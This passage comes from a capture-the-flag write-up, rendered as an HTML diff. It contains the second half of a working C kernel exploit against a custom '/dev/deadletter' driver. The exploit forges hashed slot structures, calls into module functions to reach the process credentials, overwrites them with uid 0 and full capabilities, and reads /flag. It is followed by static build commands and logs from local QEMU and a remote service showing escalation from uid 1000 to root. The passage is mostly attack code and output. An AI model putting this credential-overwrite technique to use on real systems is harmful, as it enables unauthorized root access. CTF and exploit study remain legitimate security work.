+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] current-&gt;cred = 0x%016lx (slot[0x40]=0x%016lx)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">           </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">cred_ptr</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">slot40_orig</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cred_ptr</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mh">0xffff800000000000ULL</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] cred decode failed</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="cm">/* 3. letter[0x18] chosen so 0x2b0&#39;s ctx[0x30] check passes; fix hashes */</span>
+<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">letterbuf</span><span class="p">,</span><span class="w"> </span><span class="n">letter</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80</span><span class="p">);</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">W</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">l18</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">H</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0x7374616765312121ULL</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">l28</span><span class="p">,</span><span class="w"> </span><span class="n">l68</span><span class="p">;</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">letterbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x18</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">l18</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">l28</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">func0</span><span class="p">((</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">letterbuf</span><span class="p">,</span><span class="w"> </span><span class="n">slot</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">letterbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x28</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">l28</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">l68</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">func70</span><span class="p">((</span><span class="kt">uint64_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">letterbuf</span><span class="p">,</span><span class="w"> </span><span class="n">slot</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">letterbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x68</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">l68</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] letter[0x18]=0x%016lx new hashes 0x%016lx / 0x%016lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">               </span><span class="n">l18</span><span class="p">,</span><span class="w"> </span><span class="n">l28</span><span class="p">,</span><span class="w"> </span><span class="n">l68</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="n">token</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint64_t</span><span class="p">)(</span><span class="n">rol32</span><span class="p">(</span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="mi">7</span><span class="p">)</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">B</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0x73656e64U</span><span class="p">);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] token = 0x%016lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">);</span>
+
+<span class="w">    </span><span class="cm">/* 4. first send -&gt; 0x120 : cache current-&gt;cred in ctx */</span>
+<span class="w">    </span><span class="n">memcpy</span><span class="p">(</span><span class="n">slotbuf</span><span class="p">,</span><span class="w"> </span><span class="n">slot</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80</span><span class="p">);</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">fn120</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">text_base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x120</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">enc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">enc_ptr</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span><span class="w"> </span><span class="n">fn120</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">l60</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">letter</span><span class="p">[</span><span class="mh">0xc</span><span class="p">];</span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">sc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">l60</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">B</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0x46415354U</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">hs</span><span class="p">;</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">slotbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x10</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">enc</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">slotbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x3c</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sc</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">slotbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x40</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cred_ptr</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">hs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hash_slot</span><span class="p">(</span><span class="n">slotbuf</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">slotbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hs</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] call #1 -&gt; 0x%lx (enc 0x%016lx)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">fn120</span><span class="p">,</span><span class="w"> </span><span class="n">enc</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">page_write</span><span class="p">(</span><span class="mh">0xa00</span><span class="p">,</span><span class="w"> </span><span class="n">letterbuf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;write letter&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">page_write</span><span class="p">(</span><span class="mh">0x200</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">active</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x80</span><span class="p">,</span><span class="w"> </span><span class="n">slotbuf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;write slot&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">send_call</span><span class="p">(</span><span class="n">H</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ret</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;send #1&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] send #1 returned, result=0x%lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">ret</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] stage 1 rejected</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+
+<span class="w">    </span><span class="cm">/* 5. read cred through the mode 2 window */</span>
+<span class="w">    </span><span class="n">memset</span><span class="p">(</span><span class="n">newcred</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">newcred</span><span class="p">));</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">cred_read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">newcred</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">newcred</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;cred_read&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="n">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">newcred</span><span class="p">;</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] cred[0..0x2f]: &quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">12</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%08x &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">u</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="cm">/* 6. second send -&gt; 0x2b0 : header[0x10] = cred */</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">fn2b0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">text_base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x2b0</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">enc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">enc_ptr</span><span class="p">(</span><span class="n">key1</span><span class="p">,</span><span class="w"> </span><span class="n">fn2b0</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">ctx48</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">rol64</span><span class="p">(</span><span class="n">letter</span><span class="p">[</span><span class="mh">0xb</span><span class="p">]</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">letter</span><span class="p">[</span><span class="mh">0xc</span><span class="p">]</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">cred_ptr</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">);</span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">sc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">ctx48</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="n">B</span><span class="w"> </span><span class="o">^</span><span class="w"> </span><span class="mh">0x434f4d4dU</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">hs</span><span class="p">;</span>
+
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">slotbuf</span><span class="p">,</span><span class="w"> </span><span class="n">slot</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">slotbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x10</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">enc</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">slotbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x3c</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">sc</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">slotbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x40</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">cred_ptr</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">hs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">hash_slot</span><span class="p">(</span><span class="n">slotbuf</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">(</span><span class="n">slotbuf</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">hs</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] call #2 -&gt; 0x%lx (enc 0x%016lx)</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">fn2b0</span><span class="p">,</span><span class="w"> </span><span class="n">enc</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">page_write</span><span class="p">(</span><span class="mh">0x200</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">active</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mh">0x80</span><span class="p">,</span><span class="w"> </span><span class="n">slotbuf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;write slot2&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">send_call</span><span class="p">(</span><span class="n">H</span><span class="p">,</span><span class="w"> </span><span class="n">token</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">ret</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;send #2&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] send #2 returned, result=0x%lx</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="n">ret</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ret</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[!] stage 2 rejected</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+
+<span class="w">    </span><span class="cm">/* 7. patch cred: ids = 0, full caps */</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="n">u</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">uint32_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">newcred</span><span class="p">;</span>
+<span class="w">        </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">caps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x000001ffffffffffULL</span><span class="p">;</span>
+<span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">9</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="n">u</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="n">u</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">((</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">newcred</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">44</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">caps</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">((</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">newcred</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">52</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">caps</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">((</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">newcred</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">60</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">caps</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">((</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">newcred</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">68</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">caps</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">        </span><span class="n">memcpy</span><span class="p">((</span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="n">newcred</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">76</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">caps</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">page_write</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">newcred</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">newcred</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;cred write&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[*] cred patched: uid=%d euid=%d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">getuid</span><span class="p">(),</span><span class="w"> </span><span class="n">geteuid</span><span class="p">());</span>
+
+<span class="w">    </span><span class="cm">/* 8. read flag */</span>
+<span class="w">    </span><span class="p">{</span>
+<span class="w">        </span><span class="kt">int</span><span class="w"> </span><span class="n">ff</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">open</span><span class="p">(</span><span class="s">&quot;/flag&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">O_RDONLY</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">ff</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;open /flag&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">        </span><span class="n">n</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">read</span><span class="p">(</span><span class="n">ff</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">n</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">perror</span><span class="p">(</span><span class="s">&quot;read /flag&quot;</span><span class="p">);</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"> </span><span class="p">}</span>
+<span class="w">        </span><span class="n">flag</span><span class="p">[</span><span class="n">n</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="w">        </span><span class="n">close</span><span class="p">(</span><span class="n">ff</span><span class="p">);</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] FLAG: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">flag</span><span class="p">);</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+<p>Build:</p>
+<div class="highlight"><pre><span></span><code>gcc<span class="w"> </span>-O2<span class="w"> </span>-static<span class="w"> </span>-o<span class="w"> </span>exploit<span class="w"> </span>exploit.c<span class="w">        </span><span class="c1"># local qemu testing</span>
+musl-gcc<span class="w"> </span>-O2<span class="w"> </span>-static<span class="w"> </span>-o<span class="w"> </span>exploit_musl<span class="w"> </span>exploit.c<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>strip<span class="w"> </span>exploit_musl<span class="w">   </span><span class="c1"># 42 KB for upload</span>
+</code></pre></div>
+<h2 id="evidence">Evidence<a class="headerlink" href="#evidence" title="Permanent link">&para;</a></h2>
+<p>Local QEMU (fake flag in the initramfs) — the same code path:</p>
+<div class="highlight"><pre><span></span><code>=== RUN EXPLOIT ===
+[*] running as uid=1000 euid=1000
+[*] opened /dev/deadletter
+[*] active handle = 0x2e57d62bd1bf10b7
+[*] active slot index = 6
+[*] page=0xffff8f53829db000 A=0xd1bf10b7 B=0xb473b4fb C=0x2e57d62b H=0x2e57d62bd1bf10b7
+[*] decoded .text+0xf0 = 0xffffffffc03660f0  (module base 0xffffffffc0366000)
+[*] current-&gt;cred = 0xffff8f53828d6c00 (slot[0x40]=0x0000000000000000)
+[*] letter[0x18]=0x5d23b74cb48e3196 new hashes 0x73f07fdd5de5f334 / 0xa3bca046b011aa0b
+[*] token = 0x00000000c92191c0
+[*] call #1 -&gt; 0xffffffffc0366120 (enc 0x30cad2a492e7039b)
+[*] send #1 returned, result=0x0
+[*] cred[0..0x2f]: 00000003 00000000 000003e8 000003e8 000003e8 000003e8 000003e8 000003e8 000003e8 000003e8 00000000 00000000
+[*] call #2 -&gt; 0xffffffffc03662b0 (enc 0x30cad2a491c7039b)
+[*] send #2 returned, result=0x0
+[*] cred patched: uid=0 euid=0
+[+] FLAG: Layer7{**fake_flag**}
+</code></pre></div>
+<p>Remote service (<code>nc 104.105.149.249 42789</code>), exploit uploaded as
+<code>base64</code> + <code>base64 -d</code>, full transcript in <code>work/7/remote.log</code>:</p>
+<div class="highlight"><pre><span></span><code>/ $ base64 -d /tmp/b64 &gt; /tmp/x &amp;&amp; chmod +x /tmp/x &amp;&amp; ls -l /tmp/x
+-rwxr-xr-x    1 ctf      ctf          42656 Nov 21 02:48 /tmp/x
+/ $ /tmp/x; echo EXPLOIT_RC=$?
+[*] running as uid=1000 euid=1000
+[*] opened /dev/deadletter
+[*] active handle = 0x40d47cd70720971d
+[*] active slot index = 0
+[*] page=0xffff8daf029d3000 A=0x0720971d B=0x8e28d5c5 C=0x40d47cd7 H=0x40d47cd70720971d
+[*] decoded .text+0xf0 = 0xffffffffc052a0f0  (module base 0xffffffffc052a000)
+[*] current-&gt;cred = 0xffff8daf028cf180 (slot[0x40]=0x0000000000000000)
+[*] letter[0x18]=0x33a01db06211b63c new hashes 0x68278b7fbee90205 / 0x6743e3a5b880042c
+[*] token = 0x000000006a26a23f
+[*] call #1 -&gt; 0xffffffffc052a120 (enc 0x6a71d1e9b82673a3)
+[*] send #1 returned, result=0x0
+[*] cred[0..0x2f]: 00000003 00000000 000003e8 000003e8 000003e8 000003e8 000003e8 000003e8 000003e8 000003e8 00000000 00000000
